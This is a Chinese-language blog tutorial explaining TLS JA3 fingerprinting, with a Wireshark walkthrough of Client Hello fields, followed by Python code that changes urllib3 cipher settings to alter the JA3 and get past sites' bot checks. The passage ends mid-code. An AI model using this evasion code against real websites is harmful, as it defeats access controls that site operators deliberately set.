class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>res = requests.get(<br>    url=<span class="hljs-string">&quot;https://ascii2d.net&quot;</span><br>)<br><br><span class="hljs-built_in">print</span>(res.text)<br></code></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en-US&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Just a moment...<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;Content-Type&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;text/html; charset=UTF-8&quot;</span> /&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br>   ...<br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="1-2-案例：investing"><a href="#1-2-案例：investing" class="headerlink" title="1.2 案例：investing"></a>1.2 案例：investing</h2><p><a href="https://cn.investing.com/equities/amazon-com-inc-historical-data">https://cn.investing.com/equities/amazon-com-inc-historical-data</a></p><p><img src="/./../blog_image/image-20231102222853489.png" alt="image-20231102222853489"></p><p><img src="/./../blog_image/image-20231102222951995.png" alt="image-20231102222951995"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>res = requests.get(<br>    url=<span class="hljs-string">&quot;https://cn.investing.com/equities/amazon-com-inc-historical-data&quot;</span>,<br>    headers=&#123;<br>        <span class="hljs-string">&#x27;User-Agent&#x27;</span>: <span class="hljs-string">&#x27;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36&#x27;</span>,<br>    &#125;<br>)<br>res.encoding = <span class="hljs-string">&#x27;utf-8&#x27;</span><br><span class="hljs-built_in">print</span>(res.text)<br></code></pre></td></tr></table></figure><h2 id="1-3-案例：yuanrenxue"><a href="#1-3-案例：yuanrenxue" class="headerlink" title="1.3 案例：yuanrenxue"></a>1.3 案例：yuanrenxue</h2><p><img src="/./../blog_image/image-20231102152648185.png" alt="image-20231102152648185"></p><p><img src="/./../blog_image/image-20231102152734717.png" alt="image-20231102152734717"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>res = requests.get(<br>    url=<span class="hljs-string">&quot;https://match.yuanrenxue.cn/api/match/19?page=1&quot;</span><br>)<br><br><span class="hljs-built_in">print</span>(res.text)<br></code></pre></td></tr></table></figure><h1 id="2-TLS指纹"><a href="#2-TLS指纹" class="headerlink" title="2.TLS指纹"></a>2.TLS指纹</h1><p>如今几乎所有平台通信都是基于Https的协议，而无论基于什么工具去发送Https请求时，都需要基于TLS&#x2F;SSL先建立两端安全的通信（握手），建立后再进行数据传输。</p><p>TLS的握手阶段，客户端会向服务端发送 Client Hello 数据包，在数据包内的<code>JA3</code>就是指纹信息（基于电脑的TLS版本+内置算法等计算出来的字符串），并且该值不会随着请求头修改、代理等发生变化。所以，某个网站的后台就会去读取TLS客户端的<code>JA3</code>指纹，如果是非正常指纹，禁止访问。例如：</p><ul><li><p>requests请求</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">requests</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-number">2.31</span>.<span class="hljs-number">0</span><br><span class="hljs-attribute">urllib3</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-number">2.0</span>.<span class="hljs-number">7</span><br></code></pre></td></tr></table></figure><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs subunit">[JA3 Fullstring: 771,4866<span class="hljs-string">-4867</span><span class="hljs-string">-4865</span><span class="hljs-string">-49196</span><span class="hljs-string">-49200</span><span class="hljs-string">-159</span><span class="hljs-string">-52393</span><span class="hljs-string">-52392</span><span class="hljs-string">-52394</span><span class="hljs-string">-49195</span><span class="hljs-string">-49199</span><span class="hljs-string">-158</span><span class="hljs-string">-49188</span><span class="hljs-string">-49192</span><span class="hljs-string">-107</span><span class="hljs-string">-49187</span><span class="hljs-string">-49191</span><span class="hljs-string">-103</span><span class="hljs-string">-49162</span><span class="hljs-string">-49172</span><span class="hljs-string">-57</span><span class="hljs-string">-49161</span><span class="hljs-string">-49171</span><span class="hljs-string">-51</span><span class="hljs-string">-157</span><span class="hljs-string">-156</span><span class="hljs-string">-61</span><span class="hljs-string">-60</span><span class="hljs-string">-53</span><span class="hljs-string">-47</span><span class="hljs-string">-255</span>,0<span class="hljs-string">-11</span><span class="hljs-string">-10</span><span class="hljs-string">-16</span><span class="hljs-string">-22</span><span class="hljs-string">-23</span><span class="hljs-string">-49</span><span class="hljs-string">-13</span><span class="hljs-string">-43</span><span class="hljs-string">-45</span><span class="hljs-string">-51</span><span class="hljs-string">-21</span>,29<span class="hljs-string">-23</span><span class="hljs-string">-30</span><span class="hljs-string">-25</span><span class="hljs-string">-24</span>,0<span class="hljs-string">-1</span><span class="hljs-string">-2</span>]<br><br>[JA3: bc29aa426fc99c0be1b9be941869f88a]<br><br>固定，所以后端API可以禁止此指纹。<br></code></pre></td></tr></table></figure></li><li><p>浏览器请求</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs subunit">[JA3 Fullstring: 771,4865<span class="hljs-string">-4866</span><span class="hljs-string">-4867</span><span class="hljs-string">-49195</span><span class="hljs-string">-49199</span><span class="hljs-string">-49196</span><span class="hljs-string">-49200</span><span class="hljs-string">-52393</span><span class="hljs-string">-52392</span><span class="hljs-string">-49171</span><span class="hljs-string">-49172</span><span class="hljs-string">-156</span><span class="hljs-string">-157</span><span class="hljs-string">-47</span><span class="hljs-string">-53</span>,11<span class="hljs-string">-18</span><span class="hljs-string">-27</span><span class="hljs-string">-35</span><span class="hljs-string">-16</span><span class="hljs-string">-51</span><span class="hljs-string">-10</span><span class="hljs-string">-23</span><span class="hljs-string">-5</span><span class="hljs-string">-43</span><span class="hljs-string">-65281</span><span class="hljs-string">-65037</span><span class="hljs-string">-0</span><span class="hljs-string">-17513</span><span class="hljs-string">-13</span><span class="hljs-string">-45</span>,29<span class="hljs-string">-23</span><span class="hljs-string">-24</span>,0]<br><br>[JA3: 5ae2fe79293ec63d585f3f987cf69d01]<br><br>谷歌浏览器的JA3会变化。<br></code></pre></td></tr></table></figure></li></ul><p>扩展：有些网站专门收录ja3黑名单。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>sslbl.abuse.ch<span class="hljs-regexp">/ja3-fingerprints/</span><br>https:<span class="hljs-regexp">//</span>sslbl.abuse.ch<span class="hljs-regexp">/blacklist/</span>sslblacklist.csv<br>https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/salesforce/</span>ja3<span class="hljs-regexp">/blob/m</span>aster<span class="hljs-regexp">/lists/</span>osx-nix-ja3.csv<br>https:<span class="hljs-regexp">//</span>ja3er.com/getAllUasJson<br>https:<span class="hljs-regexp">//</span>ja3er.com/getAllHashesJson<br><br></code></pre></td></tr></table></figure><h2 id="2-1-查看指纹"><a href="#2-1-查看指纹" class="headerlink" title="2.1 查看指纹"></a>2.1 查看指纹</h2><p>想要快速查看自己的TSL指纹信息：<a href="https://tls.browserleaks.com/json">https://tls.browserleaks.com/json</a></p><p><img src="/./../blog_image/image-20231102160720074.png" alt="image-20231102160720074"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>res = requests.get(<span class="hljs-string">&#x27;https://tls.browserleaks.com/json&#x27;</span>)<br><span class="hljs-built_in">print</span>(res.text)<br></code></pre></td></tr></table></figure><p><img src="/./../blog_image/image-20231102160648459.png" alt="image-20231102160648459"></p><p>其他网站还有：</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">https:</span><span class="hljs-comment">//tls.browserleaks.com/json</span><br><span class="hljs-symbol">https:</span><span class="hljs-comment">//tls.peet.ws/</span><br><span class="hljs-symbol">https:</span><span class="hljs-comment">//tls.peet.ws/api/all</span><br></code></pre></td></tr></table></figure><h2 id="2-2-Wireshark"><a href="#2-2-Wireshark" class="headerlink" title="2.2 Wireshark"></a>2.2 Wireshark</h2><p>基于Wireshark抓包并筛选出Client Hello数据包，去内部查看：</p><h3 id="1-下载安装"><a href="#1-下载安装" class="headerlink" title="1.下载安装"></a>1.下载安装</h3><p>下载并安装Wireshark  <a href="https://www.wireshark.org/download.html">https://www.wireshark.org/download.html</a></p><p><img src="/./../blog_image/image-20231102162717583.png" alt="image-20231102162717583"></p><h3 id="2-抓网卡"><a href="#2-抓网卡" class="headerlink" title="2.抓网卡"></a>2.抓网卡</h3><p>打开Wireshark，选择要抓包监测的网卡，选择你上网使用的那个网卡。</p><p><img src="/./../blog_image/image-20231102162114984.png" alt="image-20231102162114984"></p><h3 id="3-筛选IP"><a href="#3-筛选IP" class="headerlink" title="3.筛选IP"></a>3.筛选IP</h3><p>筛选目标IP <code>ip.dst_host==146.56.195.149</code></p><p><img src="/./../blog_image/image-20231102162435891.png" alt="image-20231102162435891"></p><p><img src="/./../blog_image/image-20231102162148914.png" alt="image-20231102162148914"></p><h3 id="4-数据包"><a href="#4-数据包" class="headerlink" title="4.数据包"></a>4.数据包</h3><p>用浏览器或用requests发送请求，就可以监测到网络请求，然后找到 <code>Client Hello</code>数据包，就可以看到相关指纹信息。</p><p><img src="/./../blog_image/image-20231102154253441.png" alt="image-20231102154253441"></p><h2 id="2-3-ja3"><a href="#2-3-ja3" class="headerlink" title="2.3 ja3"></a>2.3 ja3</h2><p><img src="/./../blog_image/image-20231102165413527.png" alt="image-20231102165413527"></p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs subunit">[JA3 Fullstring: 771,4866<span class="hljs-string">-4867</span><span class="hljs-string">-4865</span><span class="hljs-string">-49196</span><span class="hljs-string">-49200</span><span class="hljs-string">-159</span><span class="hljs-string">-52393</span><span class="hljs-string">-52392</span><span class="hljs-string">-52394</span><span class="hljs-string">-49195</span><span class="hljs-string">-49199</span><span class="hljs-string">-158</span><span class="hljs-string">-49188</span><span class="hljs-string">-49192</span><span class="hljs-string">-107</span><span class="hljs-string">-49187</span><span class="hljs-string">-49191</span><span class="hljs-string">-103</span><span class="hljs-string">-49162</span><span class="hljs-string">-49172</span><span class="hljs-string">-57</span><span class="hljs-string">-49161</span><span class="hljs-string">-49171</span><span class="hljs-string">-51</span><span class="hljs-string">-157</span><span class="hljs-string">-156</span><span class="hljs-string">-61</span><span class="hljs-string">-60</span><span class="hljs-string">-53</span><span class="hljs-string">-47</span><span class="hljs-string">-255</span>,0<span class="hljs-string">-11</span><span class="hljs-string">-10</span><span class="hljs-string">-16</span><span class="hljs-string">-22</span><span class="hljs-string">-23</span><span class="hljs-string">-49</span><span class="hljs-string">-13</span><span class="hljs-string">-43</span><span class="hljs-string">-45</span><span class="hljs-string">-51</span><span class="hljs-string">-21</span>,29<span class="hljs-string">-23</span><span class="hljs-string">-30</span><span class="hljs-string">-25</span><span class="hljs-string">-24</span>,0<span class="hljs-string">-1</span><span class="hljs-string">-2</span>]<br><br>[JA3: bc29aa426fc99c0be1b9be941869f88a]<br></code></pre></td></tr></table></figure><p>关于加密相关的值：</p><ul><li><p><code>JA3</code> 是对 <code>JA3 Fullstring</code>进行md5加密的结果。</p></li><li><p><code>JA3 Fullstring</code>是由五段组成</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">JA3 gathers <span class="hljs-keyword">the</span> decimal values <span class="hljs-keyword">of</span> <span class="hljs-keyword">the</span> <span class="hljs-keyword">bytes</span> <span class="hljs-keyword">for</span> <span class="hljs-keyword">the</span> following fields <span class="hljs-keyword">in</span> <span class="hljs-keyword">the</span> Client Hello packet; <br>- SSL Version,<br>- Accepted Ciphers<br>- List <span class="hljs-keyword">of</span> Extensions<br>- Elliptic Curves<br>- Elliptic Curve Formats<br>It <span class="hljs-keyword">then</span> concatenates those values together <span class="hljs-keyword">in</span> order, <span class="hljs-keyword">using</span> <span class="hljs-keyword">a</span> <span class="hljs-string">&quot;,&quot;</span> <span class="hljs-built_in">to</span> delimit <span class="hljs-keyword">each</span> field <span class="hljs-keyword">and</span> <span class="hljs-keyword">a</span> <span class="hljs-string">&quot;-&quot;</span> <span class="hljs-built_in">to</span> delimit <span class="hljs-keyword">each</span> <span class="hljs-built_in">value</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">each</span> field.<br><br>JA3 为客户端发送的clienthello 数据包中的以下字段收集字节的十进制值: SSL Version, Accepted Ciphers, List <span class="hljs-keyword">of</span> Extensions, Elliptic Curves, <span class="hljs-keyword">and</span> Elliptic Curve Formats(SSL 版本、接受的密码、扩展列表、椭圆曲线和椭圆曲线格式)。然后它将这些值按顺序连接在一起，使用“，”分隔每个字段，使用“-”分隔每个字段中的每个值。<br><br><span class="hljs-keyword">https</span>://github.com/salesforce/ja3<br></code></pre></td></tr></table></figure><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey"><span class="hljs-built_in">SSLVersion,</span> Cipher, SSLExtension, EllipticCurve, EllipticCurvePointFormat<br></code></pre></td></tr></table></figure><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs subunit">第1个值：771                                   表示SSL版本，即：TLS 1.2（0x0303），0x0303转换为10进制就是771<br><br>第2个值：4866<span class="hljs-string">-4867</span><span class="hljs-string">-4865</span><span class="hljs-string">-49196</span><span class="hljs-string">-49200</span><span class="hljs-string">-159</span><span class="hljs-string">-52393</span><span class="hljs-string">-52392</span><span class="hljs-string">-52394</span><span class="hljs-string">-49195</span><span class="hljs-string">-49199</span><span class="hljs-string">-158</span><span class="hljs-string">-49188</span><span class="hljs-string">-49192</span><span class="hljs-string">-107</span><span class="hljs-string">-49187</span><span class="hljs-string">-49191</span><span class="hljs-string">-103</span><span class="hljs-string">-49162</span><span class="hljs-string">-49172</span><span class="hljs-string">-57</span><span class="hljs-string">-49161</span><span class="hljs-string">-49171</span><span class="hljs-string">-51</span><span class="hljs-string">-157</span><span class="hljs-string">-156</span><span class="hljs-string">-61</span><span class="hljs-string">-60</span><span class="hljs-string">-53</span><span class="hljs-string">-47</span><span class="hljs-string">-255</span>        表示TLS客户端支持的加密套件。<br><br>第三个值：0<span class="hljs-string">-11</span><span class="hljs-string">-10</span><span class="hljs-string">-16</span><span class="hljs-string">-22</span><span class="hljs-string">-23</span><span class="hljs-string">-49</span><span class="hljs-string">-13</span><span class="hljs-string">-43</span><span class="hljs-string">-45</span><span class="hljs-string">-51</span><span class="hljs-string">-21</span>    表示支持的 TLS 扩展<br><br>第四个值：29<span class="hljs-string">-23</span><span class="hljs-string">-30</span><span class="hljs-string">-25</span><span class="hljs-string">-24</span>                        表示支持的支持的椭圆曲线（ECC加密算法）<br><br>第五个值：0<span class="hljs-string">-1</span><span class="hljs-string">-2</span>                                 表示支持的椭圆曲线格式<br></code></pre></td></tr></table></figure></li></ul><h3 id="1-SSLVersion"><a href="#1-SSLVersion" class="headerlink" title="1.SSLVersion"></a>1.SSLVersion</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">771<br></code></pre></td></tr></table></figure><p>将0x0303转换为10进制就是771</p><p><img src="/./../blog_image/image-20231102171445727.png" alt="image-20231102171445727"></p><h3 id="2-Cipher"><a href="#2-Cipher" class="headerlink" title="2.Cipher"></a>2.Cipher</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">4866</span>-<span class="hljs-number">4867</span>-<span class="hljs-number">4865</span>-<span class="hljs-number">49196</span>-<span class="hljs-number">49200</span>-<span class="hljs-number">159</span>-<span class="hljs-number">52393</span>-<span class="hljs-number">52392</span>-<span class="hljs-number">52394</span>-<span class="hljs-number">49195</span>-<span class="hljs-number">49199</span>-<span class="hljs-number">158</span>-<span class="hljs-number">49188</span>-<span class="hljs-number">49192</span>-<span class="hljs-number">107</span>-<span class="hljs-number">49187</span>-<span class="hljs-number">49191</span>-<span class="hljs-number">103</span>-<span class="hljs-number">49162</span>-<span class="hljs-number">49172</span>-<span class="hljs-number">57</span>-<span class="hljs-number">49161</span>-<span class="hljs-number">49171</span>-<span class="hljs-number">51</span>-<span class="hljs-number">157</span>-<span class="hljs-number">156</span>-<span class="hljs-number">61</span>-<span class="hljs-number">60</span>-<span class="hljs-number">53</span>-<span class="hljs-number">47</span>-<span class="hljs-number">255</span><br></code></pre></td></tr></table></figure><p>将算法套件的十六进制表示，转换成十进制，然后再凭借起来。</p><p><img src="/./../blog_image/image-20231102171555206.png" alt="image-20231102171555206"></p><h3 id="3-SSLExtension"><a href="#3-SSLExtension" class="headerlink" title="3.SSLExtension"></a>3.SSLExtension</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">0</span>-<span class="hljs-number">11</span>-<span class="hljs-number">10</span>-<span class="hljs-number">16</span>-<span class="hljs-number">22</span>-<span class="hljs-number">23</span>-<span class="hljs-number">49</span>-<span class="hljs-number">13</span>-<span class="hljs-number">43</span>-<span class="hljs-number">45</span>-<span class="hljs-number">51</span>-<span class="hljs-number">21</span><br></code></pre></td></tr></table></figure><p>SSL中所有的扩展对应的数字</p><p><img src="/./../blog_image/image-20231102174433762.png" alt="image-20231102174433762"></p><h3 id="4-EllipticCurve"><a href="#4-EllipticCurve" class="headerlink" title="4.EllipticCurve"></a>4.EllipticCurve</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">29</span>-<span class="hljs-number">23</span>-<span class="hljs-number">30</span>-<span class="hljs-number">25</span>-<span class="hljs-number">24</span><br></code></pre></td></tr></table></figure><p>将supported_groups对应的十六进制转换成十进制。</p><p><img src="/./../blog_image/image-20231102173836479.png" alt="image-20231102173836479"></p><h3 id="5-EllipticCurvePointFormat"><a href="#5-EllipticCurvePointFormat" class="headerlink" title="5.EllipticCurvePointFormat"></a>5.EllipticCurvePointFormat</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">0</span>-<span class="hljs-number">1</span>-<span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><p>将<code>ec_point_formats</code>转换转换十进制。</p><p><img src="/./../blog_image/image-20231102174113014.png" alt="image-20231102174113014"></p><h1 id="3-突破指纹"><a href="#3-突破指纹" class="headerlink" title="3.突破指纹"></a>3.突破指纹</h1><p>理解TLS中ja3生成机制后，绕过的思路也就有了：<strong>requests请求时，改变 <code>ja3 string</code>得内容，生成合法的的<code>ja3</code>指纹</strong>。</p><h2 id="3-1-【PY】requests【案例3】"><a href="#3-1-【PY】requests【案例3】" class="headerlink" title="3.1 【PY】requests【案例3】"></a>3.1 【PY】requests【案例3】</h2><p>requests在发送请求时，内部依赖urllib3实现。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">pip</span> install urllib3==<span class="hljs-number">1</span>.<span class="hljs-number">26</span>.<span class="hljs-number">15</span><br><span class="hljs-attribute">pip</span> install urllib3==<span class="hljs-number">1</span>.<span class="hljs-number">26</span>.<span class="hljs-number">16</span><br><span class="hljs-attribute">pip</span> install urllib3==<span class="hljs-number">2</span>.<span class="hljs-number">0</span>.<span class="hljs-number">7</span><br></code></pre></td></tr></table></figure><p><img src="/./../blog_image/image-20231102182216117.png" alt="image-20231102182216117"></p><p>自定义 <code>ciphers</code>实现生成非默认<code>ja3</code></p><p>方式1：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> urllib3<br><br>urllib3.util.ssl_.DEFAULT_CIPHERS = <span class="hljs-string">&quot;:&quot;</span>.join([<br>    <span class="hljs-comment"># &quot;ECDHE+AESGCM&quot;,</span><br>    <span class="hljs-comment"># &quot;ECDHE+CHACHA20&quot;,</span><br>    <span class="hljs-comment"># &quot;DHE+AESGCM&quot;,</span><br>    <span class="hljs-comment"># &quot;DHE+CHACHA20&quot;,</span><br>    <span class="hljs-comment"># &quot;ECDH+AESGCM&quot;,</span><br>    <span class="hljs-comment"># &quot;DH+AESGCM&quot;,</span><br>    <span class="hljs-comment"># &quot;ECDH+AES&quot;,</span><br>    <span class="hljs-string">&quot;DH+AES&quot;</span>,<br>    <span class="hljs-string">&quot;RSA+AESGCM&quot;</span>,<br>    <span class="hljs-string">&quot;RSA+AES&quot;</span>,<br>    <span class="hljs-string">&quot;!aNULL&quot;</span>,<br>    <span class="hljs-string">&quot;!eNULL&quot;</span>,<br>    <span class="hljs-string">&quot;!MD5&quot;</span>,<br>    <span class="hljs-string">&quot;!DSS&quot;</span>,<br>])<br><br>res = requests.get(<br>    url=<span class="hljs-string">&quot;https://tls.browserleaks.com/json&quot;</span>,<br>    headers=&#123;<br>        <span class="hljs-string">&#x27;User-Agent&#x27;</span>: <span class="hljs-string">&#x27;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36&#x27;</span>,<br>    &#125;<br>)<br>res.encoding = <span class="hljs-string">&#x27;utf-8&#x27;</span><br><span class="hljs-built_in">print</span>(res.text)<br><br></code></pre></td></tr></table></figure><p>方式2：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> requests.adapters <span class="hljs-keyword">import</span> HTTPAdapter<br><span class="hljs-keyword">from</span> requests.packages.urllib3.util.ssl_ <span class="hljs-keyword">import</span> create_urllib3_context<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MineAdapter</span>(<span class="hljs-title class_ inherited__">HTTPAdapter</span>):<br>    CIPHERS = <span class="hljs-string">&quot;:&quot;</span>.join(<br>        [<br>            <span class="hljs-string">&quot;ECDHE+AESGCM&quot;</span>,<br>            <span class="hljs-string">&quot;ECDHE+CHACHA20&quot;</span>,<br>            <span class="hljs-string">&quot;DHE+AESGCM&quot;</span>,<br>            <span class="hljs-string">&quot;DHE+CHACHA20&quot;</span>,<br>            <span class="hljs-string">&quot;ECDH+AESGCM&quot;</span>,<br>            <span class="hljs-string">&quot;DH+AESGCM&quot;</span>,<br>            <span class="hljs-string">&quot;ECDH+AES&quot;</span>,<br>            <span class="hljs-string">&quot;DH+AES&quot;</span>,<br>            <span class="hljs-string">&quot;RSA+AESGCM&quot;</span>,<br>            <span class="hljs-string">&quot;RSA+AES&quot;</span>,<br>            <span class="hljs-string">&quot;!aNULL&quot;</span>,<br>            <span class="hljs-string">&quot;!eNULL&quot;</span>,<br>            <span class="hljs-string">&quot;!MD5&quot;</span>,<br>            <span class="hljs-string">&quot;!DSS&quot;</span>,<br>        ]<br>    )<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">init_poolmanager</span>(<span class="hljs-params">self, *args, **kwargs</span>):<br>        context = create_urllib3_context(ciphers=self.CIPHERS)<br>        kwargs[<span class="hljs-string">&#x27;ssl_context&#x27;</span>] = context<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">super</span>().init_poolmanager(*args, **kwargs)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">proxy_manager_for</span>(<span class="hljs-params">self, *args, **kwargs</span>):<br>        context = create_urllib3_context(ciphers=self.CIPHERS)<br>        kwargs[<span class="hljs-string">&#x27;ssl_context&#x27;</span>] = context<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">super</span>().proxy_manager_for(*args, **kwargs)<br><br><br>session = requests.Session()<br>session.headers.update(&#123;<br>    <span class="hljs-string">&#x27;User-Agent&#x27;</span>: <span class="hljs-string">&#x27;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36&#x27;</span>,<br>&#125;)<br>session.mount(<span class="hljs-string">&quot;https://&quot;</span>, MineAdapter())<br><br>res = session.get(<span class="hljs-string">&quot;https://tls.browserleaks.com/json&quot;</span>)<br>res.encoding = <span class="hljs-string">&#x27;utf-8&#x27;</span><br><span class="hljs-built_in">print</span>(res.text)<br></code></pre></td></tr></table></figure><p>用此方法，可以过案例3的TLS校验机制，例如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> 